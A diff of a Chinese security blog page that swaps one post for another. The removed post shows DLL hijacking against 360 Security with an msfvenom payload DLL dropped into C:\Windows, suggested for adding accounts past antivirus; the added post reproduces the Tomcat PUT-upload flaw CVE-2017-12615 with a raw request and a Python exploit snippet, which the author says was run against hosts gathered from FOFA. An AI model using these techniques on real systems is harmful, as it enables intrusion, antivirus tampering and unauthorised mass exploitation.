@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>dll劫持破坏360 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="dll劫持破坏360 | 九世的博客">
+  <title>CVE-2017-12615复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="CVE-2017-12615复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区">
 <meta property="og:type" content="website">
@@ -950,9 +950,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-dll劫持破坏360" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2017-12615复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">dll劫持破坏360</h1>
+        <h1 class="article-title">CVE-2017-12615复现</h1>
     
     <div class="article-meta">
         
@@ -961,14 +961,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-04-07 13:56</time>
+        创建时间:<time class="date" title="更新时间: 2019-08-15 13:07:11">2019-08-15 10:08</time>
         
     </div>
     <div class="article-meta">
@@ -990,7 +990,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1005,22 +1005,18 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上研究某宏执行命令，然后想到能不能把这个该死的360给搞了。后面吃完饭发现，没法子想了一下看看能不能硬核绕60。没想到居然成了<br><img src="http://i0.hdslb.com/bfs/archive/2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg" alt="2e31734e17694760fd94e1b1f1baeb1cafd2ea71.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>实验环境：windows7<br>360版本：360安全卫士11</p>
-<p>首先生成一个dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; lbw.dll</span><br></pre></td></tr></table></figure></p>
-<p>我们使用Procmon来观察360缺少的dll</p>
-<p>Procmon配置规则如下<br><img src="https://s2.ax1x.com/2019/04/07/AhpWjA.png" alt="AhpWjA.png"></p>
-<p>启动360safe.exe<br><img src="https://s2.ax1x.com/2019/04/07/Ah9SEV.md.png" alt="Ah9SEV.md.png"></p>
-<p>其实大部分软件都有这个，后面我去问Yansu老哥，回答是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">360是用vc写的，然后360没有自带这个dll</span><br></pre></td></tr></table></figure></p>
-<p>也就是说缺少这个dll都可以利用这个操作来搞事情。好像有道理<br>之前百度云也缺少这个，试了一下也可以，没想到360也缺少这个鬼东西<br>修改msf生成的dll名为api-ms-win-core-synch-l1-2-0，扔进C:\Windows文件夹里<br>重新执行360<br><img src="https://s2.ax1x.com/2019/04/07/Ah9nUK.gif" alt="Ah9nUK.gif"></p>
-<p>发现360执行之后会弹出calc，然后启动不成功了？？？fuck<br>尝试执行命令然后添加一个用户<br><img src="https://s2.ax1x.com/2019/04/07/AhC3JU.gif" alt="AhC3JU.gif"></p>
-<p>你们在360运行的时候添加这个dll会怎么样呢？？<br><img src="https://s2.ax1x.com/2019/04/07/AhCYQJ.gif" alt="AhCYQJ.gif"></p>
-<p>经过测试360有50%几率会正常运行，有50%的几率会崩溃。但是加速球不会挂掉<br>你点一下360就会触发dll了（崩溃也会触发dll）</p>
-<p>当遇见类似于以下情况的时候可以试试：<br>拿到了管理员权限或system权限但是有360等等xxx<br><a href="http://www.91ri.org/13805.html" target="_blank" rel="noopener">思路分享：安全狗+360全套添加账户时一些小技巧_91Ri.org</a></p>
-<p><b>我在想可不可以组合攻击？？</b></p>
-<p>由于时间关系我先去上学，告辞</p>
-<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>将UAC提升到最高</p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没复现过vulhub里的漏洞了，昨天晚上复现了一个。现在记录一下<br>复现的是CVE+2017-12615<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg"></p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>利用条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat允许PUT上传</span><br><span class="line">允许写入文件</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a></p>
+<p>进入对应的文件夹执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/15/mA7etU.png" alt="mA7etU.png"></p>
+<p>访问如下<br><img src="https://s2.ax1x.com/2019/08/15/mA7thD.png" alt="mA7thD.png"></p>
+<p>开burp刷新发送POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure></p>
+<p>返回状态码为201即为上传成功<br><img src="https://s2.ax1x.com/2019/08/15/mA7Wcj.png" alt="mA7Wcj.png"></p>
+<p>构造exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rqt=requests.put(url=url+<span class="string">'&#123;&#125;'</span>.format(self.path),data=self.data,headers=self.headers,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> rqt.status_code==<span class="number">201</span>:</span><br><span class="line">    print(<span class="string">'[+] getshell成功:&#123;&#125;'</span>.format(rqt.url))</span><br><span class="line">    print(<span class="string">'[+] getshell成功:&#123;&#125;'</span>.format(rqt.url),file=open(<span class="string">'save.txt'</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure></p>
+<p>代码地址：<a href="https://github.com/422926799/python/tree/master/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE-2017-12615</a></p>
+<p>效果不咋滴，估计都修复了。从fofa爬了60页没一个成的<br><img src="https://s2.ax1x.com/2019/08/15/mAHAvd.png" alt="mAHAvd.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/15/mAHnVP.png" alt="mAHnVP.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1030,12 +1026,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>dll劫持破坏360</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2017-12615复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-07, 13:56:51</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c938687f.html" title="dll劫持破坏360">http://422926799.github.io/posts/c938687f.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-15, 10:08:24</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-15, 13:07:11</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/310ec487.html" title="CVE-2017-12615复现">http://422926799.github.io/posts/310ec487.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
